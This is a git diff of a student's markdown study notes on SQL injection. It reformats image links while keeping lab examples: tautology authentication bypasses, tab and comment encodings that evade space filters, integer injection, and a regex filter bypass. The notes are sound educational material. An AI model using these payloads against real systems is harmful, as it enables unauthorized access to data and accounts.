@@ -1,6 +1,4 @@
-# SQL
-
----
+# SQLi
 
 ## Example 1 - Basic SQLi
 
@@ -20,9 +18,7 @@
 	- effectively bypassing authentication or filters
 - `%23` decodes to `#`, everything after this is ignored
 
-!<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413155539.png" width="600"/>
-
----
+<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413155539.png" width="600"/>
 
 ## Example 2 - ERROR NO SPACE
 
@@ -34,9 +30,7 @@
 `?name=root'%09OR%09'1'='1'%09%23`
 - `%09` decodes to **tab**, which is an alternative to **space** (`%23`)
 
-![[Pasted image 20250413155950.png]]
-
----
+<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413155950.png" width="600"/>
 
 ## Example 3 - PHP Comment Spaces
 
@@ -46,9 +40,7 @@
 
 `?name=root'/**/OR/**/'1'='1'/**/%23`
 
-![[Pasted image 20250413162045.png]]
-
----
+<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413162045.png" width="600"/>
 
 ## Example 4 - Integers in SQLi
 
@@ -60,11 +52,8 @@
 
 `?id=2 OR 1=1`
 
-![[Pasted image 20250413162722.png]]
-
+<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413162722.png" width="600"/>
 -- these next 2 examples are my university scope questions, they have their own objectives -- 
-
----
 
 ## Example 5 - Oldest to Youngest
 
@@ -77,9 +66,7 @@
 `?id=2 OR 1=1 ORDER BY age DESC`
 - Youngest to Oldest: `?id=2 OR 1=1 ORDER BY age`
 
-![[Pasted image 20250413163318.png]]
-
----
+<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413163318.png" width="600"/>
 
 ## Example 6 - Regex Filter Bypass
 
@@ -101,4 +88,4 @@ if (!preg_match('/[0-9]+$/', $_GET["id"])) {
 
 ---
 
-20250413
+Last Updated 20250413
